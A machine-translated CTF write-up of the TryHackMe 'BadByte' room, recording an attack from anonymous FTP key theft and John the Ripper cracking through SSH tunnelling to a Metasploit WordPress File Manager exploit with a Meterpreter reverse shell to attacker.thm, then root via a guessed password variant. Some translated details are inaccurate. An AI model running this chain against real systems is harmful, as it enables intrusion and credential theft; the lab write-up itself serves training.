# TryHackMe writeup: BadByte

> 原文：<https://infosecwriteups.com/tryhackme-writeup-badbyte-f224175ad302?source=collection_archive---------4----------------------->

*BadByte* ( [“电子力量”和“浣熊”，2020](https://tryhackme.com/room/badbyte) )是一个试玩室，用户可以在这里“过滤 BadByte 并帮助我们接管 root。”这是一次非常有趣的经历:我在目标机器上找到了本地服务(因为系统上没有这个服务)并了解了 T2 文件。这篇文章记录了我在房间中获取用户和根标志的过程。

![](img/154324f239c011d0d36e598eeb4254c0.png)

# 程序

在我开始之前，我必须确定这个房间的目标。最终目标是检索“根标志”，这大概意味着我将需要获得一个用户 shell，并可能参与某种权限提升。

记住这一点，我将配置我的`/etc/hosts`文件，将伪域`badbyte.thm`指向 BadByte 的 IP 地址，单击第一个任务右上角的绿色“start[m]machine”按钮，等待几分钟让机器启动，然后进入侦察阶段。

## 侦察

我的第一步是使用 [nmap (n.d.)](https://nmap.org/) 扫描目标机器的开放 TCP 端口:

```
**┌──(dna㉿deniers)-[~/badbyte]**
└─$ sudo nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan.xml badbyte.thm

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at [redacted]
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at [redacted]
[... snip ...]
```

扫描完成后，我使用`xsltproc`工具将 nmap 的 XML 格式转换成一种美观易读的 HTML 格式:

```
**┌──(dna㉿deniers)-[~/badbyte]**
└─$ xsltproc tcp_scan.xml -o tcp_scan.html

┌──(dna㉿deniers)-[~/badbyte]
└─$
```

图 1 显示了 HTML 格式的`nmap`扫描结果:

![](img/ec8db01e92787bd1a1583cb79058bba7.png)

**图 1**

从这些结果来看，似乎有两个服务我可以试着隐喻性地“击倒”第一个是标准端口 22 上的 SSH 服务，第二个是 FTP 服务，有趣的是，它运行在非标准端口 30024 上。操作系统也很可能运行某种 Linux 发行版。

有趣的部分是系统上的 FTP 服务器。它似乎支持匿名用户访问，nmap 已经识别出它能够获得的两个文件:文件`id_rsa`和`note.txt`，我认为这两个文件都是 SSH 服务的私钥。因此，在攻击框中，我继续连接到 FTP 服务，然后下载这些文件:

```
**┌──(dna㉿deniers)-[~/badbyte]**
**└─$ ftp badbyte.thm -P 30024**

Connected to badbyte.thm.
220 (vsFTPd 3.0.3)
Name (badbyte.thm:dna): **anonymous**
331 Please specify the password.
Password: **[types nothing]**
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
**ftp> ls**
229 Entering Extended Passive Mode (|||6687|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp     1743 Mar 23  2021 id_rsa
-rw-r--r--    1 ftp      ftp       78 Mar 23  2021 note.txt
226 Directory send OK.
**ftp> get id_rsa**
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||48291|)
150 Opening BINARY mode data connection for id_rsa (1743 bytes).
100% |************************|  1743     11.78 MiB/s    00:00 ETA
226 Transfer complete.
1743 bytes received in 00:00 (16.15 KiB/s)
**ftp> get note.txt**
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||37448|)
150 Opening BINARY mode data connection for note.txt (78 bytes).
100% |*************************| 78      634.76 KiB/s    00:00 ETA
226 Transfer complete.
78 bytes received in 00:00 (0.51 KiB/s)
**ftp>**
```

首先，我转储了`note.txt`的内容:

```
**┌──(dna㉿deniers)-[~/badbyte]
└─$ cat note.txt     **                                            
I always forget my password. Just let me store an ssh key here.
- errorcauser

**┌──(dna㉿deniers)-[~/badbyte]
└─$**
```

看起来我试图通过 SSH 登录的用户叫做`errorcauser`。只是为了看看我是否能从`id_rsa`的原始转储中获得任何有用的信息，我决定尝试并`cat`出它的内容:

```
**┌──(dna㉿deniers)-[~/badbyte]
└─$ cat id_rsa** 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,25B4B9725AB330ECLGINB6oiLaGhDgr5D0+9C7+AJ

[... snip ...]

v6fSxb2wsx+qDnk4tO25bXq37HqqSBNw0/NyjOWe//5QE0Q5PWuoEVP/huCKcFHb
mTDaYO2KwZXCse7derYJ0eWpKiiKcmGwmi57m+uvTka+o8xA928/xw==
-----END RSA PRIVATE KEY-----

**┌──(dna㉿deniers)-[~/badbyte]
└─$**
```

在 PGP 密钥对的这一半中似乎没有任何注释。

## 初始访问

然后，我继续尝试使用用户名`errorcauser`和私钥登录 SSH 服务，作为我的身份验证手段。我将尝试不使用密码登录:

```
**┌──(dna㉿deniers)-[~/badbyte]
└─$ ssh errorcauser@badbyte.thm -i ./id_rsa**

The authenticity of host 'badbyte.thm' can't be established.
ED25519 key fingerprint is SHA256:STfSircXTndy96+rP+DhdzypBYQbjn+n8C2IReY/Vl4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? **yes**
Warning: Permanently added 'badbyte.thm' (ED25519) to the list of known hosts.
Enter passphrase for key './id_rsa': **[nothing]**
errorcauser@badbyte.thm's password: **[nothing]**
Permission denied, please try again.
errorcauser@badbyte.thm's password: **[nothing]**
Permission denied, please try again.
errorcauser@badbyte.thm's password: **[nothing]**
errorcauser@badbyte.thm: Permission denied (publickey,password).

**┌──(dna㉿deniers)-[~/badbyte]
└─$**
```

这似乎不起作用。所以我会尝试使用开膛手约翰( [Openwall，n.d.](https://www.openwall.com/john/) )根据`id_rsa`文件破解密码。我将首先使用`ssh2john.py`脚本( [Kholia 和 Forcier，n.d.](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py) )将`id_rsa`文件转换成开膛手约翰可以解析的格式，然后使用实际的开膛手约翰工具对转换后的内容执行字典攻击:

```
**┌──(dna㉿deniers)-[~/badbyte]
└─$ python3 ssh2john.py id_rsa > ssh_hash.txt**

**┌──(dna㉿deniers)-[~/badbyte]
└─$ john ssh_hash.txt --wordlist=./rockyou.txt** 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
[redacted]          (id_rsa)     
1g 0:00:00:00 DONE [redacted] 4.166g/s 2575p/s 2575c/s 2575C/s [redacted]
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

**┌──(dna㉿deniers)-[~/badbyte]
└─$**
```

开膛手约翰算出了密码是 cupcake，我试图通过 SSH 和私钥登录系统——这次是用破解的密码:

```
**┌──(dna㉿deniers)-[~/badbyte]
└─$ ssh errorcauser@badbyte.thm -i ./id_rsa**
Enter passphrase for key './id_rsa': 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-139-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/advantage
System information as of [redacted]
System load:  0.08                Processes:           96
  Usage of /:   23.2% of 18.57GB   Users logged in:     0
  Memory usage: 32%                IP address for eth0: [redacted]
  Swap usage:   0%
0 packages can be updated.
0 of these updates are security updates.
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

**-bash-4.4$**
```

太棒了。

## 后剥削

我需要在系统上获得一个根 shell，一种方法是利用在系统上本地运行的 web 管理服务，但不暴露给从互联网连接的用户。我试图用`ss`获得系统上本地运行的服务列表，但是失败了:

```
**-bash-4.4$ ss -tulpn**
-bash: ss: command not found
**-bash-4.4$**
```

尽管有一个用户 shell，我仍然需要用`nmap`探测目标机器，以确定哪种本地运行的服务可以被利用来获得`root`访问。我将打开另一个 SSH 连接，但这一次是为了建立一个 SSH 隧道(参见 [Saha，2021](https://goteleport.com/blog/ssh-tunneling-explained/) )以便可以建立这样一个隧道:

```
**┌──(dna㉿deniers)-[~/badbyte]
└─$ ssh -i id_rsa -D 1337 -N errorcauser@badbyte.thm**
Enter passphrase for key 'id_rsa': ***enters password***

[hanging]
```

设置好之后，我为 ProxyChains 工具配置了`/etc/proxychains4.conf`配置文件([“ROF 10 r”等，n.d.](https://github.com/haad/proxychains) )，使 nmap 和其他基于网络的工具通过一些代理服务。这包括将行`socks5 127.0.0.1 1337`添加到配置文件中，并“注释掉”其他未定义的代理服务。最后，我可以通过`proxychains`启动端口扫描:

```
**┌──(dna㉿deniers)-[~/badbyte]
└─$ sudo proxychains nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan_pf.xml localhost** 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 (https://nmap.org) at [redacted]
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:31
Completed NSE at 08:31, 0.00s elapsed
Initiating NSE at 08:31
Completed NSE at 08:31, 0.00s elapsed
Initiating NSE at 08:31
Completed NSE at 08:31, 0.00s elapsed
Initiating Connect Scan at 08:31
Scanning badbyte.thm [65535 ports]
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  badbyte.thm:995 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  badbyte.thm:5900 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  badbyte.thm:8888 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  badbyte.thm:113 <--socket error or timeout!
[... snip ...]
Completed NSE at [redacted]
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in [redacted]
           Raw packets sent: 16 (1.418KB) | Rcvd: 31 (2.292KB)

**┌──(dna㉿deniers)-[~/badbyte]
└─$ xsltproc tcp_scan_pf.xml -o tcp_scan_pf.html

┌──(dna㉿deniers)-[~/badbyte]
└─$**
```

这一扫描持续了几个小时，但是我能够从最近一次扫描的 XML 到 HTML 输出中发现系统上正在运行的新服务(图 2):

![](img/7dafe5fe85c20a6c3f7cc0f3ca5c992c.png)

**图 2**

结果非常详细，由于质量问题超出了我的控制范围，描述它的图像可能很难阅读，但对我来说最突出的是两个端口:在端口 80 上运行的 HTTP 服务器和在端口 3306 上运行的 MySQL 服务器。

Web 应用程序往往是最容易追求的。事实上，软件开发的整个子领域都致力于开发 web 应用程序(见 [Stuttard 和 Pinto，2011](https://isbnsearch.org/isbn/9781118026472)；[佘马，2012](https://isbnsearch.org/isbn/9781597499514)；[霍夫曼，2020](https://isbnsearch.org/isbn/9781492053088)； [Ball，2022](https://isbnsearch.org/isbn/9781718502444) )，这就是为什么从运行在端口 80 上的 HTTP 服务器开始可能是个好主意。

为了开始探测 web 服务器，我在我的 AttackBox 上设置了另一个 SSH 隧道，它将通信从端口 4000 路由到目标机器上本地运行的 web 服务器:

```
**┌──(dna㉿deniers)-[~/badbyte]
└─$ ssh -i id_rsa -L 80:127.0.0.1:80 -N errorcauser@badbyte.thm**
Enter passphrase for key 'id_rsa': *enters password*

***terminal hangs***
```

在 web 浏览器上查看 web 应用程序会显示以下(图 3)主页:

![](img/643d4c5aea4a8f0c126458cccb54ff08.png)

**图 3**

目标机器上的 web 应用程序正在使用 [Wordpress (n.d.)](https://wordpress.org/) 内容管理系统。我粗略地研究了影响这个内容管理系统的可能漏洞，并提出了两个可以利用的有趣漏洞:由[文斯特拉(2020)](https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/) 发现的目录遍历漏洞和由[钱伯兰(2020)](https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/) 发现的远程命令执行漏洞。

[Metasploit (n.d.)](https://metasploit.com/) 附带一个利用 Chamberland 发现的漏洞的模块。通过一点配置，我能够在系统上获得一个用户级 shell:

```
**┌──(dna㉿deniers)-[~/badbyte]
└─$ sudo msfconsole   **                                                                     

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com

       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 618 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View all productivity tips with the 
tips command

**msf6 > search CVE-2020-25213**
[... snip ...]
msf6 > use exploit/multi/http/wp_file_manager_rce
[*] Using configured payload php/meterpreter/reverse_tcp
[... snip ...]
**msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 127.0.0.1**
RHOSTS => 127.0.0.1
**msf6 exploit(multi/http/wp_file_manager_rce) > set LHOST attacker.thm**
LHOST => attacker.thm
**msf6 exploit(multi/http/wp_file_manager_rce) > exploit**
[*] Started reverse TCP handler on attacker.thm:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable.
[*] 127.0.0.1:80 - Payload is at /wp-content/plugins/wp-file-manager/lib/files/JBzmCG.php
[*] Sending stage (39860 bytes) to badbyte.thm
[+] Deleted JBzmCG.php
[*] Meterpreter session 1 opened (attacker.thm:4444 -> badbyte.thm:43002 ) at [redacted] -0400

**meterpreter > pwd**
/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files
**meterpreter > shell**
Process 1412 created.
Channel 0 created.
**id**
uid=1000(cth) gid=1000(cth) groups=1000(cth),27(sudo)
**exit**
**meterpreter > cd /home/cth**
**meterpreter > ls**
Listing: /home/cth
==================
[... snip ...]
100664/rw-rw-r--  38    fil   2021-03-23 17:36:05 -0400  user.txt
**meterpreter > cat user.txt**
[redacted]
**meterpreter >**
```

有了动态 Meterpreter shell 在网络上的“立足之地”,我现在可以进行这个房间的下一阶段了。下一步就是尝试获得`root`级权限。这个房间的用户试图利用一种“被颠覆的”，由于缺乏更好的术语，*认知密码攻击* ( [Bunnell 等人，1997](https://doi.org/10.1016/s0167-4048(97)00008-4) )，在这种攻击中，我们在目标机器上找到工件，并试图从它们中找出根密码。

我试着在`.bash_history`中寻找，但遗憾的是，它被象征性地与`/dev/null`联系在一起:

```
**$ ls -la**
total 36
drwxr-xr-x 4 cth  cth  4096 Mar 23  2021 .
drwxr-xr-x 4 root root 4096 Mar 23  2021 ..
lrwxrwxrwx 1 cth  cth     9 Mar 23  2021 .bash_history -> /dev/null
-rw-r--r-- 1 cth  cth   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cth  cth  3771 Apr  4  2018 .bashrc
drwx------ 2 cth  cth  4096 Mar 23  2021 .cache
drwx------ 3 cth  cth  4096 Mar 23  2021 .gnupg
-rw-r--r-- 1 cth  cth   807 Apr  4  2018 .profile
-rw-r--r-- 1 cth  cth     0 Mar 23  2021 .sudo_as_admin_successful
-rw------- 1 cth  cth   739 Mar 23  2021 .viminfo
-rw-rw-r-- 1 cth  cth    38 Mar 23  2021 user.txt
**$**
```

可悲的是，我仍然是一个超级 00b，因此需要一些黑客的帮助，这些黑客过去曾经做过这个房间。我查阅了其他文章，在 [Aldeid (n.d.)](https://www.aldeid.com/w/index.php?title=TryHackMe-Badbyte&oldid=38670) wiki 上找到了一篇建议转储`/var/log/bash.log`文件的文章，我继续这么做了:

```
**meterpreter > cat /var/log/bash.log**

Script started on 2021-03-23 21:05:06+0000

[... snip ... ]
cth@badbyte:~$ G00dP@$sw0rd2020
G00dP@: command not found
cth@badbyte:~$ passwd
Changing password for cth.
(current) UNIX password: 
Enter new UNIX password: 
Retype new UNIX password: 
passwd: password updated successfully
cth@badbyte:~$ ls

[... snip ...]
Script done on 2021-03-23 21:07:03+0000

**meterpreter>**
```

从这些输出中，我算出了`cth`的旧密码是`G00dP@$sw0rd2020`。按照应用颠覆性认知密码攻击的主题，我决定对这个基本密码进行一些反复试验:

```
**meterpreter > shell**
Process 1609 created.
Channel 9 created.
**$ id**
uid=1000(cth) gid=1000(cth) groups=1000(cth),27(sudo)

[... snip ...]
**$ sudo -S -k /bin/bash**
[sudo] password for cth: **G00dP@$$w0rd2020**
Sorry, try again.
[sudo] password for cth: **G00dP@$$w0rd2021**
Sorry, try again.
[sudo] password for cth: **G00dP@$sw0rd2021**
**# id**
uid=0(root) gid=0(root) groups=0(root)
```

当然还有“大奖”

```
**# ls -l /root**
total 4
-rw-r--r-- 1 root root 1185 Mar 23  2021 root.txt
**# cat /root/root.txt**

[... snip ...]
THM{ [redacted] }
 ________________________
< Made with ❤ by BadByte >
 ------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

**#**
```

阿洛拉。

# 摘要

根据我的经验，这是一个相当标准的房间(这不是很多 lol)。尽管如此，我还是学到了一些东西。

## 外卖食品

*   不要低估匿名访问基于 FTP 的文件服务器会发现什么。
*   在目标机器上没有`ss`实用程序的情况下，`proxychains`工具可以与 SSH 隧道结合使用，在所述目标机器上运行`nmap`扫描，这将有望揭示更多正在运行的服务。
*   始终关注 web 应用程序，它们往往是阻力最小的途径，并且可能是可靠利用的良好载体。
*   将`/var/log/bash.log`添加到潜在的“有趣”日志列表中，这些日志可以被转储作为线索。
*   温习认知密码攻击，因为人是有偏见的，是任何信息系统中最薄弱的一环；-)

## 插头

一如既往，我有义务鼓励读者给予那些需要的人经济支持。这里有一些优秀的年轻小伙子、姑娘和非二进制的人，你应该捐给他们:

*   现金伊西。app:[https://cash.app/$izzykilla](https://cash.app/$izzykilla)
*   迪. w .现金交易。app:[https://cash.app/$pitfirego](https://cash.app/$pitfirego)
*   https://account.venmo.com/u/Spitfirego
*   郭台铭谈现金。app:【https://cash.app/$octgayvian 

## 作者指出

这篇文章最初发表于:[https://epsiloncalculus . substack . com/p/tryhackme-writeup-badbyte](https://epsiloncalculus.substack.com/p/tryhackme-writeup-badbyte)

# 参考

阿尔德伊德(未注明日期)。*TryHackMe-Badbyte【2021 年 5 月 3 日修订】*。2022 年 8 月 6 日检索自:[https://www.aldeid.com/w/index.php?title=TryHackMe-Badbyte&oldid = 38670](https://www.aldeid.com/w/index.php?title=TryHackMe-Badbyte&oldid=38670)

鲍尔，首席法官(2022 年)。*黑客 API:攻破 Web 应用编程接口*。没有淀粉压机。

邦内尔、波德、亨德森、纳皮尔和肯尼迪-莫法特(1997 年)。认知密码、联想密码和常规密码:回忆率和猜测率。*在计算机&安全(第 16 卷，第 7 期，第 629–641 页)*。爱思唯尔 BV。[https://doi . org/10.1016/s 0167-4048(97)00008-4](https://doi.org/10.1016/s0167-4048(97)00008-4)

钱伯兰，C. (2020)。 *70 万 WordPress 用户受到文件管理器插件*中零日漏洞的影响。文字围栏。2022 年 6 月 6 日检索自:[https://www . word fence . com/blog/2020/09/700000-WordPress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/](https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/)

《电子力量》和《浣熊》(2020)。*坏字节*。TryHackMe。2022 年 5 月 26 日检索自:[https://tryhackme.com/room/badbyte](https://tryhackme.com/room/badbyte)

霍夫曼(2020)。 *Web 应用安全:现代 Web 应用的开发与对策*。奥莱利媒体。

Kholia 博士和 Forcier 法官(未注明日期)。 *john/ssh2john.py* 。GitHub 仓库。2022 年 5 月 27 日检索自:[https://github . com/open wall/John/blob/bleeding-jumbo/run/ssh 2 John . py](https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py)

Metasploit(未注明)。*渗透测试软件和笔测试安全*。2022 年 8 月 6 日检索自:[https://metasploit.com/](https://metasploit.com/)

nmap(未标明)。 *Nmap:网络映射器——免费安全扫描器*。2022 年 5 月 26 日检索自:【https://nmap.org/ 

开放式墙壁(未标明)。*开膛手约翰密码破解*。2022 年 5 月 27 日检索自:[https://www.openwall.com/john/](https://www.openwall.com/john/)

" rofl0r "等人(未注明)。*哈德/代理链*。GitHub 仓库。2022 年 6 月 2 日检索自:[https://github.com/haad/proxychains](https://github.com/haad/proxychains)

萨哈，S. (2021)。*什么是 SSH 隧道、SSH 反向隧道和 SSH 端口转发*？心灵传输博客。2022 年 6 月 2 日检索自:[https://goteleport.com/blog/ssh-tunneling-explained/](https://goteleport.com/blog/ssh-tunneling-explained/)

Shema，M. (2012 年)。*黑客攻击 Web 应用:检测和预防 Web 应用安全问题*。Syngress 出版社。

斯图加特博士和平托博士(2011 年)。*网络应用黑客手册:寻找和利用安全漏洞*。约翰·威利父子公司。

文斯特拉，男(2020)。对最近修补的复制器插件漏洞的主动攻击影响了超过 100 万个网站。文字围栏。2022 年 6 月 6 日检索自:[https://www . word fence . com/blog/2020/02/active-attack-on-recent-patched-duplicator-plugin-vulnerability-affects-over-100 万-sites/](https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/)

Wordpress(未注明)。*博客工具、发布平台、CMS* 。2022 年 6 月 6 日检索自:[https://wordpress.org/](https://wordpress.org/)

## 来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周简讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 个线程、3 个视频、2 个 GitHub Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！